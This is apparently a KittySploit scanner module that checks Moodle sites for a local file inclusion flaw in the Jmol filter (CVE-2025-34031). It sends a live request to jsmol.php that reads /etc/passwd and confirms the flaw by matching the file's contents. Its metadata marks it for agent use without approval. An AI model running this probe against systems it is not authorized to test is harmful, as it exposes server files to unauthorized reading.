#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Moodle Jmol Filter 6."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Moodle Jmol Filter 6.1 - Local File Inclusion Detection',
        'description': 'Moodle Jmol Filter 6.1 is vulnerable to local file inclusion through the jsmol.php file, allowing attackers to read arbitrary files on the server.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'moodle', 'lfi', 'edb', 'jsmol', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://www.exploit-db.com/exploits/46881', 'https://nvd.nist.gov/vuln/detail/CVE-2025-34031'],
        'cve': 'CVE-2025-34031',
    }

    def run(self):
        path = '/filter/jmol/js/jsmol/php/jsmol.php?call=getRawDataFromDatabase&query=file:///etc/passwd'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        ctype_any = ('text/plain',)
        body_regexes = ('root:.*:0:0:',)
        if (any(m in content_type for m in ctype_any)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason='Moodle Jmol Filter 6.1 - Local File Inclusion detected',
                path=path,
            )
            return True
        return False

